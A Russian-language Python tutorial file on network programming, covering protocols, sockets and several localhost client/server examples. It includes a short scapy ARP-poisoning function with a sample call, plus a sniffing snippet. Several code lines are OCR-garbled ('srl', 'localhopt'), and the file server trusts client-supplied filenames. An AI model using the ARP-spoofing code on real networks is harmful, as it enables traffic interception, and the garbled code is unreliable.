# ================================== Основы Сетевого Программирования ==============================================
# Интернет - это глобальная система взаимосвязанных компьютерных сетей, использующая стандартный набор протоколов 
# (TCP/IP) для обмена данными между устройствами по всему миру. 
# Интернет предоставляет пользователям доступ к обширному массиву информации и различных услуг, 
# таких как электронная почта, социальные сети, онлайн-торговля и многое другое.
# ===================================================================================================================

# ================================== Сетевые протоколы ===============================================
# TCP/IP (Transmission Control Protocol/lnternet Protocol) - это осно­ва сетевой связи, обеспечивающая передачу данных. 
# ТСР разбивает данные на пакеты и собирает их снова на получающем устройстве, а IP управляет маршрутизацией пакетов через сеть.

# НТТР/НТТРS (Hypertext Transfer Protocol/Secure) - протоколы для передачи веб-страниц. 
# HTTPS - это защищенная версия НТТР, кото­рая использует шифрование для безопасности данных.

# FTP (File Тransfer Protocol) - протокол, предназначенный для пере­дачи файлов между компьютерами.

# SMTP (Simple Mail Transfer Protocol) - протокол для отправки элек­тронной почты.

# =================================== Типы сетей ========================================================
# LAN (Local Area Network) - локальная сеть, которая охватывает не­большую территорию, такую как офис, дом или учебное заведение.
# Она позволяет подключать устройства в пределах одной области, обе­спечивая быструю и надежную связь между ними.

# WAN (Wide Area Network) - глобальная сеть, которая охватывает большие территории, такие как города, страны или даже континенты.
# Интернет является самой большой WAN в мире, соединяя миллионы сетей по всему миру.

# MAN (Metropolitan Area Network) - сеть, которая охватывает терри­торию в пределах одного города или крупного населенного пункта.
# Она больше, чем LAN, но меньше, чем WAN, и используется для связи между различными районами города.

# PAN (Personal Area Network) - личная сеть, которая охватыва­ет небольшую область вокруг пользователя, 
# например, Вluеtооth­-соединения между устройствами, такими как смартфоны, наушники и компьютеры.

# ==================================== Протоколы и службы ====================================================
# DNS (Domain Name System) - система, преобразующая удобочитае­мые доменные имена (например, www.example.com) в IР-адреса, 
# кото­рые используются для маршрутизации пакетов.

# DHCP (Dynamic Host Configuration Protocol) - протокол, автомати­зирующий назначение IР-адресов устройствам в сети.

# NAT (Network Address Translation) - технология, позволяющая не­скольким устройствам в локальной сети 
# использовать один и тот же публичный IР-адрес для выхода в интернет.

# ==============================================================================================================

# Сокет (Socket) представляет собой конечную точку двустороннего канала связи между двумя программами, работающими в сети. 
# Он служит интерфейсом для обмена данными между устройствами.

# Семейство адресов (Address Family) определяет тип адресов, которые будут использоваться сокетом. 
# Основные семейства адресов включают:
# AF_INET для 1Рv4-адресов.
# AF _INET6 для 1Рv6-адресов.
# AF_UNIX для межпроцессного взаимодействия на одном_ компьютере.

# Тип сокета (Socket Туре) определяет характер связи и способ передачи данных:
# SOCK_STREAM - обеспечивает потоковую передачу данных, использу­ется для протокола ТСР.
# SOCK_DGRAM - обеспечивает передачу датаграмм, используется для протокола UDP.
# SOCK_RAW - позволяет доступ к низкоуровневым протоколам, что по­лезно для создания собственных сетевых протоколов.

# Порт (Port) - это числовой идентификатор, используемый для различения различных приложений, работающих на одном устройстве. 
# Порт вместе с IР-адресом образует уникальный адрес для сетевого соединения.

# ================================================= Типы сокетов =======================================================
# ТСР-сокеты (SOCK_STREAM) - используются для создания надежных и устойчивых соединений, которые передают данные потоками. 
# Эти со­кеты обеспечивают передачу данных в правильном порядке и без потерь, что делает их идеальными для приложений, 
# требующих высокой надеж­ности. Сюда относятся веб-серверы, базы данных и другие критически важные системы, 
# где каждая часть информации имеет значение.

# UDР-сокеты (SOCK_DGRAM) - предназначены для передачи данных в виде датаграмм без необходимости устанавливать соединение. 
# Они не гарантируют доставку данных или их порядок, но обеспечивают более быструю передачу.

# Чтобы начать работу с сокетами, первым делом нужно импор­тировать модуль socket. 
# Это как открыть дверь в мир сетевого программирования и получить доступ ко всем инструментам для общения между компьютерами.
# import socket

# ===========================================================================================================================

# Создание сокета.
# Сокет можно создать с помощью функции socket() из модуля socket. Эта функция принимает несколько аргументов, 
# включая семейство адре­сов (AF_INET для сетевого (IPv4) соединения и AF_INET6 для IPvб), 
# тип сокета (SOCK_STREAM для ТСР и SOCK_DGRAM для UDP) и протокол (обычно О, что означает автоматический выбор протокола).
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Привязка сокета к адресу и порту (для сервера).
# Если вы создаете серверный сокет, вам нужно привязать его к конкрет­ному адресу и порту, чтобы он мог принимать входящие соединения.
server_socket.bind( (' localhost', 8080))

# Установление соединения с сервером (для клиента).
# Если вы создаете клиентский сокет, вам нужно установить соединение с сервером, указав его адрес и порт.
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect(('localhost', 8080))

# Прослушивание входящих соединений (для сервера).
# После привязки сокета к адресу и порту сервер должен начать прослушивать входящие соединения с помощью метода listen().
server_socket.listen(5) # прослушивать до 5 входящих соединений

# Принятие входящего соединения (для сервера).
# Когда сервер принимает входящее соединение, он создает новый со­кет для общения с клиентом. 
# Этот процесс осуществляется с помощью метода accept().
client_socket, client_address = server_socket.accept()

# Отправка и получение данных.
# После установления соединения данные могут быть отправлены и полу­чены с помощью методов seпd() и recv().
# На сервере
client_socket.send(b'Hello, world!')
data = client_socket.recv(1024)

# На клиенте
data = client_socket.recv(1024)
client_socket.send(b'Hello, server!')

# Закрытие сокетов.
# По завершении обмена данными сокеты должны быть закрыты с помо­щью метода close().
client_socket.close()
server_socket.close()

# АRР-отравление (ARP spoofing) - это атака, при которой зло­умышленник отправляет ложные АRР-пакеты в локальную сеть 
# с целью изменить сопоставление IР-адресов с МАС-адресами в кэше АRР-устройств.

# АRР-отравление
from scapy.all import ARP, send
def arp_poison(target_ip, spoof_ip, target_mac, spoof_mac):
    arp_response = ARP(pdst = target_ip, hwdst = target_mac,
psrc= spoof_ip, hwsrc = spoof_mac)
    send(arp_response, verbose = 0)
# Используйте IР-адреса и МАС-адреса в вашей сети
arp_poison("192.168.1.2", "192.168.1.1", "00:0c:29:6b:8e:74", "00:0c:29:4b:7d:51")

# Сниффинг трафика - это процесс перехвата и анализа сетевого трафика. 
# Злоумышленники могут использовать специальные программы для перехвата сетевого трафика и анализа передаваемой информации, 
# включая пароли и другие конфиденциальные данные.

# Сниффинг трафика
from scapy.all import sniff

def packet_callback(packet):
    print(packet.show())
sniff(prn = packet_callback, count = 10)

# Wireshark - это ваш незаменимый помощник для анализа сетевого трафика. С его помощью вы можете захватывать и раз­бирать пакеты данных, 
# как детектив, расследующий загадочные происшествия в сети. Wireshark помогает находить аномалии, выявлять уязвимости и проверять, 
# насколько хорошо защищены ваши данные.

# Scapy - это мощная библиотека для Python, которая позволяет создавать, отправлять, перехватывать и анализировать сетевые пакеты. 
# Она дает вам возможность работать с различными протоколами и создавать свои собственные инструменты для анализа и управления сетевым трафиком.

# Scapy - как швейцарский нож для сетевого анализа: универсальная и удобная!

# Scapy
from scapy.all import IP, ICMP, srl

def ping(host):
    packet = IP(dst = host) / ICMP()
    response = srl(packet, timeout = 2)
    if response:
        print(f"{host} is up")
    else:
        print(f"{host} is down")
ping("8. 8. 8. 8")

# После установления соединения данные могут быть отправлены и полу­чены с помощью методов send() и гeсv().
# Отправить и получить данные
# На сервере
client_socket.send(b'Hello, world!')
data = client_socket.recv(1024)

# На клиенте
data = client_socket.recv(1024)
client_socket.send(b'Hello, server!')

# По завершению обмена данными сокеты должны быть закрыты с помо­щью метода close().
client_socket.close()
server_socket.close()

# Примеры простого серверного и клиентского приложений
# Серверное приложение
import socket

def start_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('localhost', 8080))
    server_socket.listen(5)
    print("Cepвep ожидает соединения ...")

    while True:
        client_socket, client_address = server_socket.accept()
        print(f"Соединение установлено с {client_address}")
        client_socket.send(b'Hello, client!')
        data = client_socket.recv(1024)
        print(f"Cooбщeниe от клиента: {data.decode()}")
        client_socket.close()

if __name__ == "__main__":
    start_server()

# Серверное приложение
import socket

def start_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('localhopt', 8080))
    server_socket.listen(5)
    print("Cepвep ожидает соединения ...")
    while True:
        client_socket, client_address = server_socket.accept()
        print(f"Соединение установлено с· {client_address}")
        client_socket.send(b'Hello, client!')
        data = client_socket.recv(1024)
        print(f"Cooбщeниe от клиента: {data.decode()}")
        client_socket.close()

if __name__ == "__main__":
    start_server()

# Дополнительные возможности и особенности работы с сокетами.
# Обработка ошибок. При работе с сокетами важно обрабатывать возможные ошибки, 
# такие как потеря соединения или невозможность подключиться к серверу. Это можно сделать с помощью блоков try и except.

# Обработка ошибок
try:
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('localhost', 8080))
    server_socket.listen(5)
except socket.error as e:
    print(f"Oшибкa создания сокета: {e}")
    server_socket.close()

# Для обработки нескольких клиентов
import socket
import threading

def handle_client(client_socket):
    client_socket.send(b'Hello, client!')
    data = client_socket.recv(1024)
    print(f"Cooбщeниe от клиента: {data.decode()}")
    client_socket.close()

def start_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('localhost', 8080))
    server_socket.listen(5)
    print("Cepвep ожидает соединения ...")
    while True:
        client_socket, client_address = server_socket.accept()
        print(f"Соединение установлено с {client_address}")
        client_handler = threading.Thread(target = handle_client, args = (client_socket,))
        client_handler.start()

if __name__ == "__main__":
    start_server()

# С использованием asyncio
import asyncio

async def handle_client(reader, writer):
    writer.write(b'Hello, client!')
    await writer.drain()
    data = await reader.read(100)
    print(f"Cooбщeниe от клиента: {data.decode()}")
    writer.close()

async def main():
    server = await asyncio.start_server(handle_client, 'localhost', 8080)
    async with server:
        await server.serve_forever()

if __name__== "__main__":
    asyncio.run(main())

# ========================================================================================================================

# Простой сервер и клиент на Python с использованием сокетов
# Серверная часть
import socket

def start_server():
    # Создаем TCP/IP сокет
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Привязываем сокет к порту
    server_address = ('localhost', 12345)
    print(f"Запуск сервера на {server_address[0]}:{server_address[1]}")
    server_socket.bind(server_address)
    
    # Слушаем входящие подключения
    server_socket.listen(1)
    
    while True:
        print("Ожидание подключения...")
        # Принимаем подключение
        connection, client_address = server_socket.accept()
        
        try:
            print(f"Подключен клиент: {client_address}")
            
            # Отправляем приветственное сообщение
            welcome_message = "Привет, клиент! Вы подключились к серверу."
            connection.sendall(welcome_message.encode('utf-8'))
            
        finally:
            # Закрываем соединение
            connection.close()
            print("Соединение с клиентом закрыто")

if __name__ == "__main__":
    start_server()

# Клиентская часть
import socket

def start_client():
    # Создаем TCP/IP сокет
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Подключаемся к серверу
    server_address = ('localhost', 12345)
    print(f"Подключение к {server_address[0]}:{server_address[1]}")
    client_socket.connect(server_address)
    
    try:
        # Получаем данные от сервера
        data = client_socket.recv(1024)
        print(f"Получено сообщение от сервера: {data.decode('utf-8')}")
        
    finally:
        # Закрываем соединение
        client_socket.close()
        print("Соединение закрыто")

if __name__ == "__main__":
    start_client()

# =======================================================================================================

# Сервер и клиент для преобразования строк в верхний регистр
# Серверная часть
import socket

def start_upper_case_server():
    # Создаем TCP/IP сокет
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Привязываем сокет к порту
    server_address = ('localhost', 12345)
    print(f"Сервер преобразования в верхний регистр запущен на {server_address}")
    server_socket.bind(server_address)
    
    # Слушаем входящие подключения (максимум 5 в очереди)
    server_socket.listen(5)
    
    while True:
        print("\nОжидание подключения...")
        connection, client_address = server_socket.accept()
        
        try:
            print(f"Подключен клиент: {client_address}")
            
            while True:
                # Получаем данные от клиента
                data = connection.recv(1024)
                if not data:
                    break
                
                # Преобразуем в верхний регистр
                received_str = data.decode('utf-8').strip()
                upper_str = received_str.upper()
                print(f"Получено: '{received_str}' -> Отправлено: '{upper_str}'")
                
                # Отправляем преобразованную строку обратно
                connection.sendall(upper_str.encode('utf-8'))
                
        finally:
            # Закрываем соединение
            connection.close()
            print(f"Соединение с {client_address} закрыто")

if __name__ == "__main__":
    start_upper_case_server()

# Клиентская часть
import socket

def upper_case_client():
    # Создаем TCP/IP сокет
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Подключаемся к серверу
    server_address = ('localhost', 12345)
    print(f"Подключение к {server_address}")
    sock.connect(server_address)
    
    try:
        while True:
            # Получаем строку от пользователя
            message = input("Введите строку (или 'exit' для выхода): ")
            if message.lower() == 'exit':
                break
            
            # Отправляем строку серверу
            print(f"Отправка: {message}")
            sock.sendall(message.encode('utf-8'))
            
            # Получаем ответ от сервера
            data = sock.recv(1024)
            print(f"Получено: {data.decode('utf-8')}")
            
    finally:
        # Закрываем соединение
        sock.close()
        print("Соединение закрыто")

if __name__ == "__main__":
    upper_case_client()

# ==================================================================================================================

# Сервер и клиент для сложения чисел
# Серверная часть (server.py)
import socket

def start_sum_server():
    # Создаем TCP/IP сокет
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Привязываем сокет к порту
    server_address = ('localhost', 12345)
    print(f"Сервер сложения чисел запущен на {server_address}")
    server_socket.bind(server_address)
    
    # Слушаем входящие подключения
    server_socket.listen(1)
    
    while True:
        print("\nОжидание подключения...")
        connection, client_address = server_socket.accept()
        
        try:
            print(f"Подключен клиент: {client_address}")
            
            while True:
                # Получаем данные от клиента
                data = connection.recv(1024)
                if not data:
                    break
                
                # Декодируем и разбираем числа
                received_data = data.decode('utf-8').strip()
                try:
                    num1, num2 = map(float, received_data.split())
                    result = num1 + num2
                    print(f"Получено: {num1} + {num2} = {result}")
                    
                    # Отправляем результат обратно
                    connection.sendall(str(result).encode('utf-8'))
                except ValueError:
                    error_msg = "Ошибка: нужно отправить два числа через пробел"
                    connection.sendall(error_msg.encode('utf-8'))
                    print(error_msg)
                
        finally:
            # Закрываем соединение
            connection.close()
            print(f"Соединение с {client_address} закрыто")

if __name__ == "__main__":
    start_sum_server()

# Клиентская часть (client.py)
import socket

def sum_client():
    # Создаем TCP/IP сокет
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Подключаемся к серверу
    server_address = ('localhost', 12345)
    print(f"Подключение к {server_address}")
    sock.connect(server_address)
    
    try:
        while True:
            # Получаем числа от пользователя
            input_str = input("Введите два числа через пробел (или 'exit' для выхода): ")
            if input_str.lower() == 'exit':
                break
            
            # Отправляем числа серверу
            print(f"Отправка: {input_str}")
            sock.sendall(input_str.encode('utf-8'))
            
            # Получаем ответ от сервера
            data = sock.recv(1024)
            print(f"Результат: {data.decode('utf-8')}")
            
    finally:
        # Закрываем соединение
        sock.close()
        print("Соединение закрыто")

if __name__ == "__main__":
    sum_client()

# ===========================================================================================================

# Сервер и клиент для передачи файлов
# Серверная часть (file_server.py)
import socket
import os

def save_file(connection, filename):
    try:
        with open(filename, 'wb') as file:
            while True:
                data = connection.recv(1024)
                if not data:
                    break
                file.write(data)
        return True
    except Exception as e:
        print(f"Ошибка при сохранении файла: {e}")
        return False

def start_file_server():
    # Создаем TCP/IP сокет
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Привязываем сокет к порту
    server_address = ('localhost', 12345)
    print(f"Файловый сервер запущен на {server_address}")
    server_socket.bind(server_address)
    
    # Слушаем входящие подключения
    server_socket.listen(5)
    
    # Создаем папку для сохранения файлов
    if not os.path.exists('server_files'):
        os.makedirs('server_files')
    
    while True:
        print("\nОжидание подключения...")
        connection, client_address = server_socket.accept()
        
        try:
            print(f"Подключен клиент: {client_address}")
            
            # Получаем имя файла
            filename = connection.recv(1024).decode('utf-8').strip()
            if not filename:
                continue
                
            print(f"Получение файла: {filename}")
            
            # Сохраняем файл
            filepath = os.path.join('server_files', filename)
            if save_file(connection, filepath):
                print(f"Файл {filename} успешно сохранен")
                connection.sendall(b"Файл успешно сохранен на сервере")
            else:
                connection.sendall(b"Ошибка при сохранении файла")
                
        except Exception as e:
            print(f"Ошибка: {e}")
        finally:
            # Закрываем соединение
            connection.close()
            print(f"Соединение с {client_address} закрыто")

if __name__ == "__main__":
    start_file_server()

# Клиентская часть (file_client.py)
import socket
import os

def send_file(sock, filepath):
    try:
        # Отправляем имя файла
        filename = os.path.basename(filepath)
        sock.sendall(filename.encode('utf-8'))
        
        # Отправляем содержимое файла
        with open(filepath, 'rb') as file:
            while True:
                data = file.read(1024)
                if not data:
                    break
                sock.sendall(data)
        return True
    except Exception as e:
        print(f"Ошибка при отправке файла: {e}")
        return False

def start_file_client():
    # Создаем TCP/IP сокет
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Подключаемся к серверу
    server_address = ('localhost', 12345)
    print(f"Подключение к {server_address}")
    sock.connect(server_address)
    
    try:
        while True:
            # Получаем путь к файлу от пользователя
            filepath = input("Введите путь к файлу (или 'exit' для выхода): ")
            if filepath.lower() == 'exit':
                break
                
            if not os.path.exists(filepath):
                print("Файл не найден")
                continue
                
            # Отправляем файл
            print(f"Отправка файла: {filepath}")
            if send_file(sock, filepath):
                # Получаем ответ от сервера
                response = sock.recv(1024).decode('utf-8')
                print(f"Ответ сервера: {response}")
                
    finally:
        # Закрываем соединение
        sock.close()
        print("Соединение закрыто")

if __name__ == "__main__":
    start_file_client()

# ==================================================================================================================================

# Сервер времени и клиент для получения текущего времени
# Серверная часть (time_server.py)
import socket
import time
from threading import Thread
from datetime import datetime

clients = []

def handle_client(connection, address):
    try:
        print(f"Подключен клиент: {address}")
        clients.append(connection)
        
        while True:
            # Получаем текущее время
            current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            # Отправляем время клиенту
            try:
                connection.sendall(current_time.encode('utf-8'))
            except:
                break
            
            # Ждем 1 секунду перед следующей отправкой
            time.sleep(1)
            
    except Exception as e:
        print(f"Ошибка с клиентом {address}: {e}")
    finally:
        clients.remove(connection)
        connection.close()
        print(f"Соединение с {address} закрыто")

def start_time_server():
    # Создаем TCP/IP сокет
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    # Привязываем сокет к порту
    server_address = ('localhost', 12345)
    print(f"Сервер времени запущен на {server_address}")
    server_socket.bind(server_address)
    
    # Слушаем входящие подключения
    server_socket.listen(5)
    
    try:
        while True:
            print("\nОжидание подключения...")
            connection, client_address = server_socket.accept()
            
            # Запускаем отдельный поток для клиента
            client_thread = Thread(target = handle_client, args = (connection, client_address))
            client_thread.daemon = True
            client_thread.start()
            
    except KeyboardInterrupt:
        print("\nЗавершение работы сервера...")
    finally:
        server_socket.close()
        print("Сервер остановлен")

if __name__ == "__main__":
    start_time_server()

# Клиентская часть (time_client.py)
import socket

def start_time_client():
    # Создаем TCP/IP сокет
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Подключаемся к серверу
    server_address = ('localhost', 12345)
    print(f"Подключение к серверу времени {server_address}")
    sock.connect(server_address)
    
    try:
        while True:
            # Получаем текущее время от сервера
            data = sock.recv(1024)
            if not data:
                break
                
            print(f"Текущее время: {data.decode('utf-8')}")
            
    except KeyboardInterrupt:
        print("\nЗавершение работы клиента...")
    finally:
        sock.close()
        print("Соединение закрыто")

if __name__ == "__main__":
    start_time_client()

# ===============================================================================================================

# Эхо-сервер и клиент на Python
# Серверная часть (echo_server.py)
import socket
from threading import Thread

def handle_client(connection, address):
    try:
        print(f"Подключен клиент: {address}")
        
        while True:
            # Получаем данные от клиента
            data = connection.recv(1024)
            if not data:
                break
                
            print(f"Получено от {address}: {data.decode('utf-8')}")
            
            # Отправляем данные обратно (эхо)
            connection.sendall(data)
            
    except ConnectionResetError:
        print(f"Клиент {address} отключился неожиданно")
    except Exception as e:
        print(f"Ошибка с клиентом {address}: {e}")
    finally:
        connection.close()
        print(f"Соединение с {address} закрыто")

def start_echo_server():
    # Создаем TCP/IP сокет
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    # Привязываем сокет к порту
    server_address = ('localhost', 12345)
    print(f"Эхо-сервер запущен на {server_address}")
    server_socket.bind(server_address)
    
    # Слушаем входящие подключения
    server_socket.listen(5)
    
    try:
        while True:
            print("\nОжидание подключения...")
            connection, client_address = server_socket.accept()
            
            # Запускаем отдельный поток для клиента
            client_thread = Thread(target = handle_client, args = (connection, client_address))
            client_thread.daemon = True
            client_thread.start()
            
    except KeyboardInterrupt:
        print("\nЗавершение работы сервера...")
    finally:
        server_socket.close()
        print("Сервер остановлен")

if __name__ == "__main__":
    start_echo_server()

# Клиентская часть (echo_client.py)
import socket

def start_echo_client():
    # Создаем TCP/IP сокет
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Подключаемся к серверу
    server_address = ('localhost', 12345)
    print(f"Подключение к эхо-серверу {server_address}")
    sock.connect(server_address)
    
    try:
        while True:
            # Получаем сообщение от пользователя
            message = input("Введите сообщение (или 'exit' для выхода): ")
            if message.lower() == 'exit':
                break
                
            # Отправляем сообщение серверу
            sock.sendall(message.encode('utf-8'))
            
            # Получаем ответ от сервера
            data = sock.recv(1024)
            print(f"Получено от сервера: {data.decode('utf-8')}")
            
    except ConnectionResetError:
        print("Сервер разорвал соединение")
    except Exception as e:
        print(f"Ошибка: {e}")
    finally:
        sock.close()
        print("Соединение закрыто")

if __name__ == "__main__":
    start_echo_client()